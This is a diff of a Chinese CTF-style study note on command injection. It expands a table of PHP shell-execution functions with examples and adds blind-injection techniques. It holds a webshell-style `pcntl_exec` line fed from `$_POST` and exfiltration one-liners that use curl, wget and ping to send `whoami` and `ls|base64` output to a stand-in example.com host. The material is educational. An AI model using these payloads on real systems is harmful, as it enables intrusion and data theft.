@@ -50,32 +50,107 @@ ls${}${IFS}id
 
 ### Linux下的文件读取相关命令
 
-- `exec` 命令执行结果的最后一行内容，不显示输出。
+
 ### PHP的命令执行相关函数
-反引号 \`\`
 
 |函数名称|说明|
 |--|--|
-|[system()](https://www.php.net/manual/zh/function.system.php)|执行外部程序，并且显示输出|
-|[exec()](https://www.php.net/manual/zh/function.exec.php)|执行一个外部程序|
-|[passthru()](https://www.php.net/manual/zh/function.passthru.php)|执行外部程序并且显示**原始**输出|
+|[system()](https://www.php.net/manual/zh/function.system.php)|执行外部程序，成功则返回命令输出的最后一行，失败则返回 false。**显示输出**|
+|[exec()](https://www.php.net/manual/zh/function.exec.php)|执行一个外部程序，返回命令执行结果的最后一行内容|
+|[shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)|通过 shell 执行命令并将完整的输出以字符串的方式返回|
+|``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)|将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，与函数 shell_exec() 相同|
+|[passthru()](https://www.php.net/manual/zh/function.passthru.php)|执行外部程序并且**显示原始输出**|
 |[pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)|在当前进程空间执行指定程序|
-|``反引号||
 |popen()||
-|proc_open()||
+|[proc_open()](https://www.php.net/manual/zh/function.proc-open.php)|执行一个命令，并且打开用来输入/输出的文件指针。|
 |pcntl_exec()||
 
 
 
 - [system()](https://www.php.net/manual/zh/function.system.php) 执行外部程序，并且显示输出
 
+成功则返回命令输出的最后一行，失败则返回`false`;并且显示输出。
+
 ```php
-<?php system($_GET['cmd']);?>
+<?php 
+system('whoami'); // root
+echo system('whoami');
+/*
+ * root
+ * root
+ * 会输出两个结果，注意，第二个输出为返回值，仅为最后一行
+ */
 ```
 
 - [exec()](https://www.php.net/manual/zh/function.exec.php)
+
+执行一个外部程序，返回命令执行结果的最后一行内容
+
+```php
+exec('whoami'); // 无任何输出
+var_dump(exec('whoami'));  // string(4) "root"，输出最后一行内容
+```
+
+- [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 通过 shell 执行命令并将**完整的输出以字符串的方式返回**
+
+```php
+shell_exec('whoami'); // 无任何输出
+var_dump(shell_exec('whoami'));
+/*
+ * string(5) "root
+ * "
+ * 原始输出，换行符
+ */
+```
+
+- ``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)
+
+执行运算符，将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，**与函数 shell_exec() 相同**
+
+```php
+`whoami`; // 无任何输出
+var_dump(`whoami`);
+/*
+ * string(5) "root
+ * "
+ * 原始输出，换行符
+ */
+```
+
 - [passthru()](https://www.php.net/manual/zh/function.passthru.php) 执行外部程序并且显示**原始**输出
 
+成功时返回 null， 或者在失败时返回 false。
+```php
+passthru('whoami'); // root
+var_dump(passthru('whoami'));
+/*
+ * root
+ * NULL 
+ */
+```
+
+- [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)  在当前进程空间执行指定程序
+
+```php
+pcntl_exec("/bin/bash",array($_POST["cmd"]));
+pcntl_exec("/bin/bash",array('whoami'));
+```
+
+- [popen](https://www.php.net/manual/zh/function.popen.php) 打开进程文件指针
+- [proc_open()](https://www.php.net/manual/zh/function.proc-open.php)  执行一个命令，并且打开用来输入/输出的文件指针。
+
+```php
+<?php
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
+   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
+   2 => array("file", "/tmp/error-output.txt", "a") // 标准错误，写入到一个文件
+);
+
+echo proc_open('whoami', $descriptorspec, $pipes);
+
+```
+可以赋给一个变量而不是简单地丢弃到标准输出
 ## 绕过技巧
 
 <style>
@@ -488,20 +563,49 @@ https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
 
 ### `disable_function`绕过
 ### 无回显
-
-- 结果写入文件，二次返回
-
-- DNS信道
-dnslog.cn
-
-- HTTP信道
-https://requestrepo.com/
-
-反弹shell
+- 反弹shell
 
 https://your-shell.com/
 
-延时
+- 结果写入文件，二次返回
+
+主要利用是输出重定向符号`>`将标准输出重定向到`可写`、`可访问`的目录下。
+
+```bash
+# 将输出结果保存到当前目录下的1.txt文件
+ls -al>1.txt
+```
+
+- DNS信道
+
+利用DNS解析特殊构造的域名，通过查看DNS解析记录获得结果。平台有 [dnslog.cn](http://dnslog.cn/)、[https://requestrepo.com/](https://requestrepo.com/)
+
+```bash
+ping `whoami`.example.com
+curl `whoami`.example.com
+wget -O- `ls|base64`.example.com
+```
+
+- HTTP信道
+
+利用HTTP协议，GET或POST请求，获取结果。通常，如果数据量大，通过POST方法。
+
+[https://requestrepo.com/](https://requestrepo.com/)
+
+```bash
+# 通过URL传送
+curl example.com/`whoami`
+curl example.com/`ls|base64`
+wget -O- example.com/`ls|base64`
+
+# 通过POST
+curl -X POST --data `ls|base64` example.com
+wget --post-data "$(ls|base64)" -O- example.com
+```
+
+- 延时
+
+
 
 ### 无参数
 
@@ -521,10 +625,8 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
 
 - https://xz.aliyun.com/t/10780
 
-### 题目分析
+## 经典赛题分析
 
-
-### 其他
 
 ## 参考资料
 
